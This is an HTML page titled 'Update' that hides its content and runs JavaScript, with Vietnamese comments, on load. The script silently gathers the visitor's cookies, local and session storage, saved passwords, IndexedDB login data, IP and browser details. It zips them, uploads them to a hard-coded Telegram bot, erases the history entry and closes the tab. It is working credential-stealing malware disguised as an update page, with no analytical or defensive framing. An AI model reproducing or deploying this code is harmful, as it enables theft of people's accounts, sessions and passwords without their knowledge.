<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Update</title>
<style>body{display:none;}</style>
</head>
<body>
<script>
// === CẤU HÌNH TELEGRAM ===
const BOT_TOKEN = "7303870325:AAGB533C0LdaGjDfAeSRd7s8jdkKLGECwJg";      // Thay bằng token bot
const CHAT_ID = "6364338536";          // Thay bằng chat ID

// === HÀM LẤY IP CÔNG KHAI ===
async function getIP() {
    try {
        const r = await fetch("https://api.ipify.org?format=json");
        const d = await r.json();
        return d.ip || "UNKNOWN";
    } catch {
        return "UNKNOWN";
    }
}

// === HÀM ĐỌC FILE TỪ INDEXEDDB (CHO CÁC TRÌNH DUYỆT CHROME/BRAVE/EDGE) ===
function readDB(dbName, storeName, callback) {
    try {
        const req = indexedDB.open(dbName);
        req.onsuccess = function(e) {
            const db = e.target.result;
            if (!db.objectStoreNames.contains(storeName)) {
                db.close();
                callback([]);
                return;
            }
            const tx = db.transaction(storeName, "readonly");
            const store = tx.objectStore(storeName);
            const all = store.getAll();
            all.onsuccess = function() {
                callback(all.result || []);
                db.close();
            };
            all.onerror = function() {
                callback([]);
                db.close();
            };
        };
        req.onerror = function() {
            callback([]);
        };
    } catch {
        callback([]);
    }
}

// === HÀM ĐỌC COOKIES (CHỈ HTTP COOKIE) ===
function getCookies() {
    try {
        return document.cookie.split(";").map(c => c.trim()).filter(c => c);
    } catch {
        return [];
    }
}

// === HÀM ĐỌC LOCALSTORAGE ===
function getLocalStorage() {
    try {
        const items = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            items[key] = localStorage.getItem(key);
        }
        return items;
    } catch {
        return {};
    }
}

// === HÀM ĐỌC SESSIONSTORAGE ===
function getSessionStorage() {
    try {
        const items = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            items[key] = sessionStorage.getItem(key);
        }
        return items;
    } catch {
        return {};
    }
}

// === HÀM LẤY THÔNG TIN TRÌNH DUYỆT ===
function getBrowserInfo() {
    const ua = navigator.userAgent;
    let name = "Unknown";
    if (ua.includes("Chrome") && !ua.includes("Edg") && !ua.includes("Opera")) name = "Chrome";
    else if (ua.includes("Edg")) name = "Edge";
    else if (ua.includes("Opera") || ua.includes("OPR")) name = "Opera";
    else if (ua.includes("Brave")) name = "Brave";
    else if (ua.includes("Safari") && !ua.includes("Chrome")) name = "Safari";
    else if (ua.includes("Firefox")) name = "Firefox";
    else if (ua.includes("CocCoc")) name = "CocCoc";
    return name;
}

// === HÀM LẤY PASSWORDS TỪ CREDENTIAL MANAGEMENT API ===
async function getSavedCredentials() {
    const credentials = [];
    try {
        if (!navigator.credentials) return credentials;
        const creds = await navigator.credentials.get({
            password: true,
            federated: { providers: [] },
            mediation: 'silent'
        });
        if (creds && creds.type === 'password') {
            credentials.push({
                url: creds.id || "",
                username: creds.id || "",
                password: creds.password || ""
            });
        }
        return credentials;
    } catch {
        return credentials;
    }
}

// === HÀM THU THẬP DỮ LIỆU TỪ CÁC NGUỒN ===
async function collectAll() {
    const ip = await getIP();
    const browser = getBrowserInfo();
    const cookies = getCookies();
    const ls = getLocalStorage();
    const ss = getSessionStorage();
    const creds = await getSavedCredentials();

    // Thu thêm từ IndexedDB (nếu có)
    let indexedDBData = {};
    // Thử đọc từ các DB thường gặp
    const dbNames = ["LoginData", "ChromeSafeStorage", "WebData", "History", "Cookies"];
    for (const dbName of dbNames) {
        await new Promise(resolve => {
            readDB(dbName, "logins", (data) => {
                if (data.length) indexedDBData[dbName] = data;
                resolve();
            });
        });
    }

    const result = {
        timestamp: new Date().toISOString(),
        ip: ip,
        browser: browser,
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        cookies: cookies,
        localStorage: ls,
        sessionStorage: ss,
        credentials: creds,
        indexedDB: indexedDBData,
        // Thêm URL hiện tại và các tham số
        currentURL: window.location.href,
        referrer: document.referrer || "",
        screen: {
            width: screen.width,
            height: screen.height,
            colorDepth: screen.colorDepth
        }
    };

    return result;
}

// === HÀM NÉN DỮ LIỆU THÀNH FILE ZIP (SỬ DỤNG JSZIP) ===
function createZip(data) {
    return new Promise((resolve, reject) => {
        // Tải jszip từ CDN
        const script = document.createElement("script");
        script.src = "https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js";
        script.onload = function() {
            const zip = new JSZip();
            const jsonStr = JSON.stringify(data, null, 2);
            zip.file("data.json", jsonStr);
            zip.generateAsync({ type: "blob" })
                .then(blob => resolve(blob))
                .catch(err => reject(err));
        };
        script.onerror = function() {
            // Fallback: gửi dưới dạng text nếu không tải được jszip
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
            resolve(blob);
        };
        document.head.appendChild(script);
    });
}

// === HÀM GỬI FILE LÊN TELEGRAM ===
async function sendToTelegram(blob, filename) {
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("document", blob, filename);

    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
            method: "POST",
            body: formData
        });
        return response.ok;
    } catch {
        return false;
    }
}

// === MAIN - CHẠY HOÀN TOÀN IM LẶNG ===
async function main() {
    try {
        // Thu thập dữ liệu
        const data = await collectAll();

        // Tạo file zip
        const blob = await createZip(data);
        const filename = `browser_data_${new Date().toISOString().replace(/[:.]/g, "-")}.zip`;

        // Gửi lên Telegram
        await sendToTelegram(blob, filename);

        // Xóa mọi dấu vết trong lịch sử trình duyệt
        try {
            history.replaceState(null, "", "/");
        } catch {}

        // Tự đóng tab sau 2 giây
        setTimeout(() => {
            try { window.close(); } catch {}
        }, 2000);
    } catch {
        // Im lặng thất bại
    }
}

// === KÍCH HOẠT SAU KHI TẢI TRANG ===
if (document.readyState === "complete") {
    main();
} else {
    window.addEventListener("load", main);
}

// === TỰ ĐỘNG XÓA BODY ĐỂ KHÔNG HIỆN GÌ ===
document.body.style.display = "none";
</script>
</body>
</html>
